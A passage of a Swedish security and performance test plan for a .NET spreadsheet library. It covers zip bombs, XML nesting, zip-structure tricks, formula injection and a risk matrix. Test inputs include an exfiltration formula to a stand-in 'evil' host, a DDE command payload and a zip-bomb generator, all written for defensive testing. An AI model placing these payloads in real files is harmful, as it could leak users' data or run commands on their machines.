  - En gräns `MaxSharedStrings`, eller att strängarna räknas mot `MaxCells`.
  - Alternativt läses delade strängar vid behov via ett index i stället för att läsas in.

**S-05 Hög CPU-belastning [B][C]**
- **Attacker och skydd:**

| Attack | Skydd |
|---|---|
| Djupt nästlad XML i en cell (P07) | **Saknas.** Gräns för XML-djup, se S-09. |
| Formler över hela bladet | `MaxArrayCells` finns, men SUM(A:XFD) är en funktionell brist (P15). |
| 100 000 formler i kedja (P17, P18) | Klaras på 2 sekunder. |
| 1 000 000 formler med VLOOKUP över 1 miljon rader, alltså O(n²) | Bara `CancellationToken`. |
| Många `INDIRECT` och `OFFSET`, som är flyktiga och beräknas vid behov | Bara `CancellationToken`. |
| Reguljära uttryck i jokertecken för kriterier (`"*a*a*a*a*b"`) | `Regex` har en timeout på 1 sekund, och den finns redan i `Criteria`. |

- **Test:** varje attack med `CancellationTokenSource(TimeSpan.FromSeconds(5))`. Svaret ska vara `OperationCanceledException` inom ett par sekunder efter gränsen. Mät hur ofta avbrottet kontrolleras.
- **Observera:** att avbrottet faktiskt stoppar beräkningen. En enda funktion som går igenom en miljon värden kontrollerar inte token inne i sin loop.

**S-06 Oändliga loopar [B]**
- **Testdata:**
  - Cirkelreferenser.
  - Namn som refererar till sig själva (P20).
  - INDIRECT som pekar på sig själv.
  - En delad formel vars ref omfattar den första cellen.
  - Relationer i en cykel (`rels` som pekar på varandra).
  - Ett `<f t="shared">` utan ursprungscell.
- **Förväntat:** att beräkningen avslutas med 0, `#NAME?` eller `#REF!`.
- **Täckt av:** `FormulaEngineTests` och P20. **Saknas:** relationer i en cykel. Paketet följer bara relationer från arbetsboken och bladen, så risken bör vara låg.

**S-07 Många samtidiga uppladdningar [C]**
- **Attack:** 100 parallella uppladdningar på 50 MB vardera. Varje `Workbook` håller hela filen och dess celler.
- **Test:** `Parallel.ForEachAsync` med `MaxDegreeOfParallelism` 8, 32 och 128 mot samma och mot olika filer, i en container med `--memory=4g --cpus=2`.
- **Observera:**
  - Toppminnet och om processen dör av OOM.
  - Att svaren är korrekta, alltså att trådisoleringen håller (P21 för 32 parallella).
  - GC-paustider.
- **Skydd:** gränserna gäller per fil, och appen måste själv begränsa hur många filer som bearbetas samtidigt, till exempel med `SemaphoreSlim`. Det ska stå i README:n. **Saknas där än.**

**S-08 Trådar som blockeras länge [B]**
- **Risk:** `RecalculateAsync` kör omräkningen med `Task.Run` på trådpoolen, synkront. `Evaluate` är synkron. En lång beräkning binder en trådpoolstråd, och många samtidiga beräkningar kan svälta trådpoolen i ASP.NET.
- **Test:** 64 samtidiga omräkningar på 5 sekunder vardera, med `dotnet-counters` för `threadpool-queue-length` och `threadpool-thread-count`.
- **Skydd:** `CancellationToken` finns. Appen bör köra tunga beräkningar i en egen kö. Ett **möjligt tillägg** är att låta omräkningen lämna tråden ibland.

### 2.2 XML- och zip-attacker

**S-09 XXE, billion laughs och djup nästling [B]**
- **Attack:** en `<!DOCTYPE>` med externa entiteter eller expanderande entiteter, eller extrem nästling av element.
- **Läget:**
  - DTD är förbjudet (`DtdProcessing.Prohibit`, `XmlResolver = null`). XXE ger `Invalid` (P12).
  - Billion laughs stoppas också, eftersom det kräver en DTD.
  - Djup nästling: **brist** (P07). 200 000 nivåer i en cell tar 28 sekunder.
- **Test:**
  - XXE i varje XML-del, alltså workbook, rels, styles, sharedStrings och blad.
  - Nästling 1 000, 10 000 och 100 000 nivåer i en cell, i `sharedStrings` och i `styles`.
- **Skydd som saknas:** en gräns för XML-djup, till exempel 64 nivåer inne i en cell och 256 i en del, kontrollerad i läsloopen (`reader.Depth > limit` ger `InvalidDataException`). Excel nästlar aldrig djupare än cirka 10 nivåer.

**S-10 Manipulerade zip-strukturer [B]**
- **Testdata:**
  - Lokalt huvud och central katalog som säger olika saker.
  - Överlappande poster.
  - Negativa eller jättestora offsets.
  - Zip64 med falska fält.
  - Postnamn med NUL.
  - En krypterad post.
  - Andra komprimeringsmetoder än deflate (LZMA, bzip2).
  - En kommentar på 64 kB.
  - Många poster, 100 000 eller fler.
- **Förväntat:** `Invalid`. `ZipArchive` ger `InvalidDataException`, och den fångas i `OpenSeekableAsync`. Inget annat undantag.
- **Test:** en egen mutator för zip-binärer, se Z-03. Testa också `NotSupportedException` för okänd komprimering och krypterade poster. **Det kan vara ett hål**, eftersom den inte fångas idag.

**S-11 Path traversal via postnamn (zip slip) [B]**
- **Läget:**
  - Paketet packar aldrig upp till disk, och inga filer skrivs (P03).
  - Relationsmål som `../../` normaliseras och slås bara upp i arkivet (P04).
  - Men postnamnen följer med oförändrade när filen sparas (P03).
- **Risk:** en tjänst öppnar uppladdningen, sparar den och lämnar den till ett annat system som packar upp den naivt.
- **Skydd som rekommenderas:** postnamn med `..`, en inledande `/`, en enhetsbokstav, `\` eller styrtecken behandlas som en skadad fil. Alternativt tas de bort när filen sparas. Lägg också till ett test som verifierar att `SaveAsync(stream)` aldrig rör filsystemet.

**S-12 Dubbla postnamn [B]**
- **Läget:** läsaren tar den första, och saveren behåller en (P02). Andra bibliotek kan ta den sista, så det blir en tolkningsskillnad.
- **Risk:** en virusskanner eller ett DLP-filter som använder bibliotek X godkänner en del som Avig.Kalkyl sedan läser på ett annat sätt.
- **Skydd som rekommenderas:** dubbla namn behandlas som en skadad fil, med `Invalid`. Jämför också skiftlägesokänsligt, eftersom OPC kräver det.

**S-13 Felaktiga content types och relationer [B]**
- **Testdata:**
  - En arbetsbok med innehållstypen för Word.
  - `[Content_Types].xml` saknas (P11 godtas).
  - En `Override` för en del som inte finns.
  - En relation till sig själv.
  - En relation till en extern URL (`TargetMode="External"`).
- **Förväntat:**
  - Externa mål följs aldrig. Det är verifierat i koden, eftersom `ReadRelationshipsAsync` hoppar över dem.
  - Saknade delar ger `Invalid`.
- **Beslut att ta:** ska saknade content types ge `Invalid`, som i Excel?

### 2.3 Excel-specifika attacker

**S-14 Formelinjektion (CSV/DDE-injektion) [A]**
- **Attack:** användardata som börjar med `=`, `+`, `-`, `@` eller tabb skrivs till en fil som någon sedan öppnar i Excel. Där blir det en formel, till exempel `=HYPERLINK("http://evil/?"&A1)` eller DDE.
- **Mot paketet:** `XlsxWriter` och `Cell.Of(text)` skriver text som `inlineStr`, alltså aldrig som formel. Bara `Cell.FromFormula` skapar formler.
- **Test:** skriv `=1+1`, `@SUM(A1)` och `=cmd|' /C calc'!A0` som text. Kontrollera att XML:en har `t="inlineStr"` och ingen `<f>`.
- **Skydd:** finns. Dokumentera att `Cell.FromFormula` aldrig ska få okontrollerad användardata. Ett möjligt tillägg är en hjälpmetod `Cell.SafeText` för export till CSV.

**S-15 DDE och externa anrop vid omräkning [B]**
- **Läget:** DDE, `WEBSERVICE`, `FILTERXML`, `RTD`, `CALL`, `REGISTER.ID` och externa arbetsböcker ger `#NAME?` eller `#REF!` (P09, P10). Paketet har ingen kod för nätverk eller processer.
- **Test:**
  - Kör omräkningen i en container med `--network none`. Inga försök till anslutning ska synas, kontrollerat med `strace` eller ETW.
  - Kör testet för varje funktion som Excel klassar som extern.
- **Skydd:** finns. Ett regressionstest ska säkerställa att listan över funktioner aldrig får `WEBSERVICE` eller liknande utan ett aktivt val.

**S-16 Makron i XLSM [A]**
- **Läget:** makron körs aldrig, och `vbaProject.bin` följer med oförändrad när filen sparas (P01).
- **Risk:** en app som "tvättar" filer genom att öppna och spara dem tror felaktigt att makron är borta.
- **Skydd:** finns. `Workbook.HasMacros` och `RemoveMacros()` för VBA-projektet (2026-11-24).
  `Workbook.ActiveContent` och `RemoveActiveContent()` för allt aktivt innehåll: VBA,
  XLM-makroblad och dialogblad med namn som Auto_Open, ActiveX, OLE-objekt, externa länkar,
  DDE och dataanslutningar (2026-11-25, se statusen ovan).

**S-17 Hyperlänkar, externa data och dolt innehåll [A]**
- **Läget:** hyperlänkar, `connections.xml`, Power Query (`customXml`), OLE-objekt och dolda blad läses inte och tolkas inte. De följer med orörda när filen sparas, utom efter `RemoveActiveContent()`, som tar bort allt utom hyperlänkarna och de dolda bladen. `Workbook.ExternalReferences` listar de externa relationerna och DDE-länkarna.
- **Test:** kontrollera att ingen av dem påverkar värden och att inget läses därifrån. `ActiveContentTests` för upptäckt och borttagning.
- **Skydd:** dokumenterat i README:n (Files from outside, 19. Active content).

### 2.4 Övriga risker

**S-18 Buffer overflow och minnesfel [B]**
- **Läget:** paketet är helt managed. Det har ingen `unsafe`-kod och inga P/Invoke-anrop (verifierat med `grep unsafe|DllImport|LibraryImport`). Det finns bara en `stackalloc` på 3 char i `CellAddress.ColumnName`. Zip och XML hanteras av BCL i .NET. Risken ligger i .NET-runtimen och patchas med runtime-uppdateringar.
- **Test:** fuzzmålet `xlsx-part` körs täckningsstyrt med libFuzzer. Det har körts i tre minuter med 4 arbetare, och fynden är rättade. En hel natt återstår.

**S-19 Heltalsspill [B]**
- **Rättat:** `ValueArray` räknade storleken med `int` (60 000 × 60 000) och kontrollerar nu med `long`.
- **Kvar att granska:**
  - Index för delade strängar (`<v>2147483648</v>`).
  - Stilindex (`s="99999999999"`).
  - `spans`.
  - Kolumnbredd och `<col max="2147483647">`.
  - `ROW()` och `COLUMN()` på gränsen.
- **Test:** en tokenlista för fuzzern med alla gränsvärden för heltal, se Z-06.

**S-20 Fel undantagstyp när en fil läses (P05, P06) [B]**
- **Brist:** text över 32 767 tecken ger `ArgumentOutOfRangeException`.
- **Åtgärd:** `CellXml.ToValue` och läsningen av delade strängar ska ge `InvalidDataException`, eller trunkera, när texten är för lång. Lägg till ett regressionstest.
- **Kontrollera också andra konstruktorer som kastar när de får värden från en fil:**
  - `CellValue.Error` med en okänd kod. Där finns redan en reserv.
  - `Style`, till exempel teckenstorlek. Rättat.
  - `CellAddress`.

**S-21 Path traversal, läsning av godtyckliga filer och oavsiktlig filskrivning [A]**
- **Läget:** paketet läser och skriver bara den sökväg som anroparen anger. Relationsmål, `INDIRECT`, externa referenser och `CELL("filename")` når aldrig filsystemet (P04, P09, P10).
- **Risk:** appen bygger sökvägen själv från användardata. Det ligger utanför paketet.
- **Test:** kör alla attackfiler med en `FileSystemWatcher` på en tom katalog och med Process Monitor eller `strace -e trace=file`. Den enda filåtkomsten ska vara testfilen.

**S-22 Läckor via felmeddelanden [A]**
- **Läget:**
  - Meddelanden innehåller sökvägen som anroparen angav ("'C:\uploads\x.xlsx' does not exist").
  - De innehåller bladnamn och cellinnehåll ("holds 'abc', which is not a number").
  - De innehåller .NET:s egna XML-meddelanden.
  - De innehåller inga stackspår och inga hemligheter.
- **Risk:** appen visar `Result.Error` direkt för en extern användare. Då syns serverns sökvägar och innehållet i filen.
- **Test:** samla in alla felmeddelanden från fuzzkorpusen och sök efter mönster som `[A-Z]:\\`, `/home/`, `/var/` och miljövariabler.
- **Skydd:** dokumentera att `Error` är till för loggen och utvecklaren, inte för slutanvändaren. Överväg en `Result.Status` plus en felkod som kan visas utan risk.

**S-23 Sårbara beroenden och kodexekvering via beroenden [A]**
- Se avsnitt 5. Det finns ett beroende vid körning: Avig.Result. Analyzers och generatorn ingår inte i paketet vid körning. Generatorn körs i **konsumentens kompilator**, så den är en del av leveranskedjan.

**S-24 Deserialisering [A]**
- **Läget:** ingen `BinaryFormatter`, ingen polymorf JSON och ingen `XmlSerializer`. Den typade mappningen är genererad kod och har ingen reflektion. Risken är **inte tillämplig**, men ett grep-test i CI ska hålla det så.

**S-25 Kapplöpning vid samtidig läsning [A][C]**
- **Läget:**
  - `XlsxReader` och `Workbook` är inte trådsäkra för samtidig ändring. Det ska dokumenteras.
  - Separata instanser är oberoende (P21).
  - `ValueArray`-gränsen är trådstatisk och sätts och återställs inom en beräkning. Två `Workbook` på samma tråd i nästlade anrop har inte prövats.
- **Test:**
  - 32 trådar som läser samma `Workbook`. Det ska fungera, men det är inte prövat.
  - En tråd som ändrar och en som räknar om. Det ska antingen ge ett definierat fel eller dokumenteras som "inte stöd".

---

## 3. Prestanda och belastning

### Mätvärden

| Mått | Verktyg |
|---|---|
| Tid till första raden och total tid | `Stopwatch` och BenchmarkDotNet |
| Allokerade byte per fil och per cell | `GC.GetTotalAllocatedBytes`, BenchmarkDotNet `[MemoryDiagnoser]` |
| Toppminne (working set och managed heap) | `Process.PeakWorkingSet64`, `dotnet-counters` (`gc-heap-size`, `working-set`) |
| GC-insamlingar (gen 0, 1 och 2) och paustid | `dotnet-counters` (`gen-2-gc-count`, `time-in-gc`), `dotnet-trace` |
| CPU-tid | `Process.TotalProcessorTime`, `dotnet-counters` (`cpu-usage`) |
| Trådpool | `threadpool-queue-length`, `threadpool-thread-count` |
| Minnesläckor | `dotnet-gcdump` före och efter, med jämförelse av antal objekt per typ |

### Scenarier

| ID | Scenario | Mål (förslag) |
|---|---|---|
| P-01 | Strömläsning av filer på 1, 10 och 100 MB samt 1 GB. 1 GB kräver `Unlimited`. | Linjär tid, och toppminnet är oberoende av filstorleken, högst 100 MB plus de delade strängarna. |
| P-02 | 100 000, 500 000 och 1 000 000 rader × 10 kolumner, med strömläsaren, mappningen och dokumentmodellen. | Strömläsaren klarar mer än 200 000 rader per sekund. Dokumentmodellen använder högst 300 byte per cell. Jämför med ExcelDataReader och ClosedXML i samma körning. |
| P-03 | Arbetsboken med 478 000 formler: öppna och räkna om. | Öppning under 11 s och omräkning under 6 s, som ligger till grund. Ingen försämring över 20 %. |
| P-04 | 1, 100, 1 000 och 5 000 blad. | Linjär tid. Idag allokerar 5 000 blad 2,2 GB (P13), och det ska utredas. |
| P-05 | 8, 32 och 128 samtidiga läsningar av olika filer. | Genomströmningen ökar upp till antalet kärnor. Inga fel, och rätt svar i varje tråd. |
| P-06 | Samma fil läses 10 000 gånger i följd. | Stabilt minne efter uppvärmning, under 5 % tillväxt mellan körning 1 000 och 10 000. Ingen tillväxt i gen 2. |
| P-07 | Långvarig belastning: 4 timmar med en blandning av filer och 16 parallella, med `dotnet-counters` som loggar till CSV. | Inget trendande minne och ingen ökande GC-tid. |
| P-08 | Stress: öka antalet parallella tills det går sönder, med `--memory=2g`. | Felet ska vara kontrollerat, i form av `Invalid` eller avbrott. OOM-död eller hängning räknas som fel. |
| P-09 | Spik: från 1 till 200 samtidiga på en sekund och tillbaka. | Återgår till baslinjen inom 60 sekunder, utan kvarstående trådpoolskö. |
| P-10 | Minnesläckor: `dotnet-gcdump` efter 1 000 och efter 10 000 körningar av öppna, räkna om, spara och kasta. | Inga `Workbook`, `Worksheet` eller `ZipArchive` kvar. |
| P-11 | Allokering per formel i en kedja (P18). | Idag är det 74 kB per formel. Målet är under 5 kB. Börja med att profilera `Recalculator` med `dotnet-trace`. |

Om en mätning som återupprepas i CI blir mer än 20 % sämre än baslinjen ska bygget
misslyckas. Kör BenchmarkDotNet på en dedikerad maskin. Molnmaskiner i CI varierar för mycket.

---

## 4. Fuzzning och negativa tester

Det mesta finns redan i `tools/Avig.Kalkyl.Fuzz`. Se dess README för mål, sabotage och fynd.
Det som återstår:

| ID | Område | Finns | Saknas |
|---|---|---|---|
| Z-01 | Muterade XLSX-filer | `xlsx-part` byter ut en av åtta delar mot muterad XML. | Fler delar i mallen: tabeller, kommentarer, ritningar och `calcChain`. Fler startfiler: kompatibilitetsfilerna. |
| Z-02 | Korrupt XML | `xlsx-part` innehåller tokenlistor med entiteter, CDATA och namnrymder. | Mätning av djup, se P07 och S-09. Lägg till ett djupfall i generatorn. |
| Z-03 | Trasiga zip-arkiv | Saknas. | Ett nytt mål, `zip-raw`, som muterar binären i en giltig .xlsx: lokala huvuden, central katalog, offsets och storlekar. Förväntat utfall är `Invalid` eller `InvalidDataException`. |
| Z-04 | Fel filhuvud och magiska byte | Signaturkontroll finns (`CheckSignatureAsync`). | Fuzza de första 8 byten: OLE, PK med fel version, UTF-8 BOM och en HTML-fil. |
| Z-05 | Saknade obligatoriska delar | `xlsx-part` kan tömma en del. | Ta bort delar helt, inte bara tömma dem. |
| Z-06 | Fel datatyper och gränsvärden för heltal | Tokenlistan innehåller 2147483648, 1e309, `-1` och `s="9999"`. | Systematiskt: varje heltalsattribut (`s`, `r`, `si`, `numFmtId`, `fontId`, `count`, `min`, `max`, `xSplit`) gånger varje gränsvärde, som ett svep likt `formula-sweep`. |
| Z-07 | Extremt långa strängar | `roundtrip` testar högst 255 tecken. | 32 767, 32 768 och 1 000 000 tecken i `<t>`, `<f>`, `<v>`, bladnamn, `formatCode` och sökvägar i relationer. P05 hade hittats här. |
| Z-08 | Nästlade och oväntade strukturer | Djup nästling av formler finns (`formula`). | Djup nästling av XML, se Z-02. |
| Z-09 | Mutation av giltiga filer | Korpusen skapas av generatorn. | Använd de 38 kompatibilitetsfilerna, uppackade del för del, som startpunkt för libFuzzer. |
| Z-10 | Täckningsstyrning | `fuzz.ps1` och `fuzz-night.ps1` med libFuzzer. | Körd i några minuter per mål. Kör en hel natt, och mät täckningen med `coverlet` på korpusen. |

Fuzzern har en grundregel: **varje nytt mål ska kunna hitta ett fel som läggs in med avsikt.**
Det står i fuzz-README:n, med sabotage för alla mål. Gör samma sak för Z-03 till Z-08.

---

## 5. Beroenden och leveranskedja

| Område | Läge | Verktyg och åtgärd |
|---|---|---|
| Transitiva beroenden | Bara Avig.Result 1.0.2. `publish.ps1` avbryter om något annat kommer med. | Behåll kontrollen. Kör `dotnet list package --include-transitive` i CI. |
| Kända CVE | Inga, enligt `dotnet list package --vulnerable` 2026-11-24. Zip och XML kommer från BCL och följer .NET-runtimen. | Slå på `<NuGetAudit>true</NuGetAudit>`, `<NuGetAuditMode>all</NuGetAuditMode>` och `<NuGetAuditLevel>low</NuGetAuditLevel>` i `Directory.Build.props`, med varningar som fel. Lägg till Dependabot eller GitHub Dependency Review när repot finns på GitHub. Körs runtimen på en server ska den hållas uppdaterad, eftersom säkerhetsfixar för `System.IO.Compression` och `System.Xml` kommer den vägen. |
| Föråldrade paket | Analyzers 1.2.0. Testpaketen pinnas. | `dotnet list package --outdated`, och `dotnet outdated` (verktyg) en gång i månaden. |
| Leveranskedja | Byggs lokalt och publiceras via Trusted Publishing, som inte är uppsatt än. | `packages.lock.json` med `RestoreLockedMode` i CI. Package Source Mapping i `nuget.config` mot nuget.org och den lokala feeden. Signerade paket och `dotnet nuget verify`. En SBOM med `Microsoft.Sbom.Tool` eller CycloneDX för .NET. Generatorn (`Avig.Kalkyl.Generators`) körs i konsumentens kompilator och ska granskas som kod som körs under bygget. |
| Risker i zip- och XML-biblioteken | Bara BCL. Inga tredjepartsbibliotek för zip eller XML. Det är ett medvetet val, se `docs/analys.md`. | Bevaka säkerhetsmeddelanden för .NET (`dotnet/announcements`). |
| Licenser | Paketet har MIT-licens, och Avig.Result också. Testprojekten använder ClosedXML, ExcelDataReader och Sylvan (MIT) samt MiniExcel (Apache-2.0), och ingen av dem följer med i paketet. Testfilerna laddas ner och läggs inte in i repot, på grund av licenserna. | Kör `nuget-license` (dotnet tool) i CI för både paketet och testerna. |
| Integritet | Paketet skickar ingen telemetri och gör inga nätverksanrop. | Ett grep-test i CI som avbryter om `System.Net` eller `HttpClient` börjar användas i `src/`. |

---

## 6. Automatisering och verktyg

| Behov | Verktyg |
|---|---|
| Enhetstester, attackfiler och regressionstester | xUnit, som redan används. Med `Xunit.SkippableFact` för tester som kräver nedladdade filer. |
| Jämförelse med andra bibliotek | `tests/Avig.Kalkyl.Compatibility`, som finns. |
| Fuzzning | SharpFuzz och libFuzzer (`tools/Avig.Kalkyl.Fuzz`). |
| Prestanda | BenchmarkDotNet med `[MemoryDiagnoser]` och `[ThreadingDiagnoser]`. |
| Övervakning medan testet körs | `dotnet-counters`, `dotnet-trace`, `dotnet-gcdump` och `dotnet-monitor` i containern för belastningstester. |
| Isolering | Docker med `--network none --memory=2g --cpus=2 --pids-limit=256 --read-only`, och tmpfs för `/tmp`. På Windows: Job Objects eller Windows Sandbox. |
| Filåtkomst | Process Monitor (Windows), `strace -f -e trace=file,network` (Linux) och ETW via `dotnet-trace` med `Microsoft-Windows-Kernel-File`. |
| Webbappen runt paketet | OWASP ZAP mot uppladdningen: storleksgränser, innehållstyp och gränser per användare. Inte mot paketet självt. |
| Beroenden | NuGet Audit, `dotnet list package --vulnerable`, Dependabot, OSV-Scanner och `nuget-license`. |

### 6.1 Test med en attackfil (xUnit) [B]

```csharp
/// <summary>Text longer than a cell may hold must be a damaged file, not an ArgumentOutOfRangeException (S-20).</summary>
[Theory]
[InlineData("sharedString")]
[InlineData("inlineString")]
public async Task Text_longer_than_a_cell_may_hold_is_a_damaged_file(string kind)
{
    string text = new('a', CellValue.MaxTextLength + 1);
    await using MemoryStream file = HostileFiles.WithInlineString(text);

    if (kind == "sharedString")
    {
        await file.DisposeAsync();
        file = HostileFiles.WithSharedString(text);
    }

    await Assert.ThrowsAsync<InvalidDataException>(() => TestFiles.ReadRowsAsync(file));
    file.Position = 0;
    Assert.True((await Workbook.OpenAsync(file)).IsFailure(out _, out _));
}
```

`HostileFiles` byggs på `TestFiles.Package` (finns), med en metod per attack. Därmed körs alla
[B]-tester i vanlig CI utan filer på disk.

### 6.2 Zip-bomb i full storlek, genererad som ström [C]

```csharp
/// <summary>Writes a valid xlsx whose sheet unpacks to <paramref name="bytes"/>, without holding it in memory.</summary>
public static async Task WriteBombAsync(string path, long bytes)
{
    await using FileStream file = File.Create(path);
    await using ZipArchive zip = new(file, ZipArchiveMode.Create);
    // … [Content_Types].xml, _rels/.rels, workbook och rels som i TestFiles.Package …
    await using Stream sheet = zip.CreateEntry("xl/worksheets/sheet1.xml", CompressionLevel.SmallestSize).Open();
    await sheet.WriteAsync("<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"><sheetData><row r=\"1\"><c r=\"A1\" t=\"inlineStr\"><is><t>"u8.ToArray());
    byte[] chunk = new byte[1 << 20];
    Array.Fill(chunk, (byte)'a');

    for (long written = 0; written < bytes; written += chunk.Length)
    {
        await sheet.WriteAsync(chunk);
    }

    await sheet.WriteAsync("</t></is></c></row></sheetData></worksheet>"u8.ToArray());
}
```

Kör testet i containern. Förväntat: `Workbook.OpenAsync` ger `Invalid` med meddelandet
"MaxUncompressedBytes" inom 100 ms. `XlsxReader` med `Unlimited` ska läsa radvis tills
`CancellationToken` avbryter.

### 6.3 Gränser för tid, minne och krascher i en egen process [C]

Stackspill och OOM går inte att fånga inne i testprocessen. Kör därför varje fil från
korpusen i en barnprocess med en tidsgräns och läs av exitkoden, så som
`tools/Avig.Kalkyl.Fuzz --repro` redan gör:

```csharp
ProcessStartInfo start = new("dotnet", $"tools/Avig.Kalkyl.Fuzz/bin/Release/net10.0/Avig.Kalkyl.Fuzz.dll xlsx-part --repro \"{file}\"")
{
    RedirectStandardOutput = true,
    Environment = { ["DOTNET_GCHeapHardLimit"] = "0x40000000" }, // 1 GiB managed heap
};
using Process child = Process.Start(start)!;
bool finished = child.WaitForExit(TimeSpan.FromSeconds(30));
// Underkänt: finished == false (hänger), ExitCode == -1073741571 (stackspill), OutOfMemory i utdata.
```

### 6.4 Prestandamätning (BenchmarkDotNet) [A]

```csharp
[MemoryDiagnoser, ThreadingDiagnoser]
public class ReadBenchmarks
{
    private byte[] file = [];

    [Params(100_000, 500_000, 1_000_000)]
    public int Rows { get; set; }

    [GlobalSetup]
    public async Task SetupAsync() => file = await Files.GenerateAsync(Rows, columns: 10);

    [Benchmark(Baseline = true)]
    public async Task<int> StreamingAsync()
    {
        await using MemoryStream stream = new(file);
        (await XlsxReader.OpenAsync(stream)).IsSuccess(out XlsxReader? reader);
        await using (reader)
        {
            reader!.Sheet(0).IsSuccess(out SheetReader? sheet);
            int count = 0;
            await foreach (Row row in sheet!.ReadRowsAsync()) { count += row.ColumnCount; }
            return count;
        }
    }

    [Benchmark]
    public async Task<int> DocumentAsync() { /* Workbook.OpenAsync, Sheets[0].RowCount */ }

    [Benchmark]
    public int ExcelDataReader() { /* same file, for comparison */ }
}
```

### 6.5 Samtidighet och läckor [A]

```csharp
[Fact]
public async Task Thirty_two_parallel_recalculations_give_the_same_answer_and_release_their_memory()
{
    byte[] file = await Files.WithFormulasAsync(2_000);
    long before = GC.GetTotalMemory(forceFullCollection: true);

    CellValue[] answers = new CellValue[32];
    await Parallel.ForAsync(0, 32, async (index, token) =>
    {
        Result<Workbook> opened = await Workbook.OpenAsync(new MemoryStream(file), token);
        opened.IsSuccess(out Workbook? book);
        await book!.RecalculateAsync(RecalculationScope.All, token);
        answers[index] = book.Sheets[0]["B5"].Value;
    });

    Assert.Single(answers.Distinct());
    Assert.True(GC.GetTotalMemory(forceFullCollection: true) - before < 50_000_000);
}
```

### 6.6 Övervakning under belastningstester [C]

```powershell
dotnet-counters collect --process-id $pid --format csv --output soak.csv `
    --counters System.Runtime[gc-heap-size,gen-2-gc-count,time-in-gc,working-set,cpu-usage,threadpool-queue-length,threadpool-thread-count]
dotnet-gcdump collect --process-id $pid --output after-1000.gcdump
```

---

## 7. Riskmatris

Sannolikheten avser en tjänst som tar emot uppladdade filer från användare. Konsekvensen
avser den tjänsten. Risknivån är sannolikheten gånger konsekvensen, och listan är sorterad
efter risk.

| # | Attack eller feltyp | Sannolikhet | Konsekvens | Risk | Rekommenderat test | Föreslagen åtgärd | Status |
|---|---|---|---|---|---|---|---|
| 1 | Djupt nästlad XML ger CPU-DoS (P07) | Hög | Hög: 28 s CPU av en fil på 1,4 MB, och upprepbart | **Kritisk** | S-09, Z-02 | Gräns för XML-djup i läsloopen | Åtgärdad 2026-11-24: djupgräns 100 i `DepthLimitedXmlReader`, 10 ms i stället för 28 s |
| 2 | Undantag som inte fångas för lång text (P05, P06) | Hög | Hög: processen eller begäran kraschar, utanför kontraktet | **Kritisk** | S-20, Z-07 | `InvalidDataException` och `Invalid`, plus regressionstest | Åtgärdad 2026-11-24: skadad fil i `CellXml.Text` |
| 3 | Zip-bomb eller falskt huvud | Hög | Hög: OOM | Hög | S-02 | `KalkylLimits` och `LimitedStream` | Åtgärdad, test med falskt huvud via `LimitedStream` och `zip-raw` |
| 4 | Delade strängar fyller minnet (S-04) | Medel | Hög: flera GB | Hög | S-04 | `MaxSharedStrings`, eller att strängarna räknas mot `MaxCells` | Åtgärdad 2026-11-24: `MaxSharedStrings`, 10 miljoner som standard |
| 5 | Djupt nästlade formler ger stackspill | Medel | Hög: processen dör | Hög | `formula`-fuzz | Gräns för nästling och loop över kedjor | Åtgärdad 2026-11-24 |
| 6 | Många samtidiga uppladdningar (S-07) | Hög | Medel: OOM och svält i trådpoolen | Hög | P-05, P-08, S-08 | Dokumentera hur samtidigheten begränsas, och gör omräkningen avbrytbar oftare | Dokumenterad i README (Concurrency). Avbrott kontrolleras i områdesloopar. |
| 7 | Aggregat över hela kolumner bygger en matris (P15) | Medel | Medel: fel svar (`#NUM!`) och tidigare OOM | Medel | F-11 | Aggregatfunktioner som bara går igenom celler som finns | Åtgärdad 2026-11-24: glesa vägar i `NonBlankValues` och `TryMatch` |
| 8 | Dubbla postnamn ger tolkningsskillnad (P02) | Låg | Hög där ett filter används | Medel | S-12 | `Invalid` vid dubbletter | Åtgärdad 2026-11-24: `Invalid` |
| 9 | Postnamn för zip slip följer med när filen sparas (P03) | Låg | Hög hos den som packar upp längre fram | Medel | S-11 | Avvisa eller ta bort sådana namn | Åtgärdad 2026-11-24: `Invalid` |
| 10 | Makron följer med när filen "tvättas" (P01) | Medel | Medel | Medel | S-16 | `HasMacros` och ett val för att ta bort dem, eller dokumentation | Åtgärdad 2026-11-24: `HasMacros` och `RemoveMacros`; 2026-11-25 också XLM, ActiveX, OLE, länkar och anslutningar med `ActiveContent` och `RemoveActiveContent` |
| 11 | Felmeddelanden läcker sökvägar och innehåll (S-22) | Medel | Låg till medel | Medel | S-22 | Dokumentation och felkoder | Åtgärdad 2026-11-24: `KalkylErrorKind`, och meddelandena är dokumenterade som loggtext |
| 12 | Formelinjektion vid export (S-14) | Medel | Medel hos den som öppnar filen | Medel | S-14 | Finns: text blir aldrig formel. Dokumentera `FromFormula`. | Åtgärdad: test och varning i `Cell.FromFormula` |
| 13 | Okända undantag från zip-lagret (S-10, `NotSupportedException`) | Låg | Medel | Låg till medel | Z-03 | Fånga och returnera `Invalid` | Åtgärdad 2026-11-24: `CheckEntriesAsync` öppnar varje post |
| 14 | Allokeringstryck vid många formler (P11) | Medel | Låg | Låg | P-11 | Profilera `Recalculator` | Åtgärdad 2026-11-24: öppning 11 kB per cell i stället för 67 kB; omräkning 2 kB per formel |
| 15 | XXE och billion laughs | Hög | Hög | Låg, eftersom det redan är skyddat | S-09 | DTD är förbjudet | Åtgärdad, verifierad (P12) |
| 16 | DDE, externa referenser och nätverk | Medel | Hög | Låg, eftersom det redan är skyddat | S-15 | Ingen nätverkskod, och `#NAME?` | Åtgärdad, verifierad (P09, P10) |
| 17 | Path traversal och filåtkomst från paketet | Låg | Hög | Låg | S-21 | Ingen filåtkomst utöver anroparens sökväg | Verifierad i koden och med P03, P04 |
| 18 | Sårbart beroende | Låg | Hög | Låg | avsnitt 5 | NuGet Audit och lockfil | Åtgärdad 2026-11-24: NuGet Audit på nivån low och låsfiler |
| 19 | Deserialisering | Mycket låg | Hög | Mycket låg | S-24 | Grep-test i CI | Inte tillämpligt |
| 20 | En zip som säger två saker visar en skanner en arbetsbok och Excel en annan | Medel | Hög hos den som litar på skannern | Medel | S-10 | Strikt kontroll av zip-strukturen | Åtgärdad 2026-11-25: `KalkylLimits.StrictZip`, på som standard |
| 21 | Externa länkar, DDE, OLE och dataanslutningar följer med när filen "tvättas" | Medel | Hög hos den som öppnar filen i Excel | Medel | S-17 | Rapportera och ta bort | Åtgärdad 2026-11-25: `ActiveContent`, `ExternalReferences` och `RemoveActiveContent` |

---

## 8. Acceptanskriterier

Paketet anses tillräckligt testat för 1.0.0 när alla kriterier nedan är uppfyllda.

